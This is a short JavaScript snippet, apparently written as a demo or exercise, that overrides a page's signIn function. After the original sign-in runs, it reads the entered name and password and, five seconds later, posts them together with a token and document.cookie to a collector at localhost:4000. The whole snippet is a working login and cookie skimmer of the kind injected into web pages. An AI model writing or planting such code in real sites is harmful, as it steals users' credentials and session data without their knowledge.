let originalSignIn = signIn;

signIn = () => {
  originalSignIn();
  const name = document.getElementById("nameInput").value;
  const password = document.getElementById("passwordInput").value;
  setTimeout(() => {
    const Http = new XMLHttpRequest();
    const url = "http://localhost:4000";
    Http.open("POST", url);
    Http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    Http.send(
      "name=" +
        name +
        "&password=" +
        password +
        "&token=" +
        token +
        "&cookie=" +
        document.cookie
    );
  }, 5000);
};
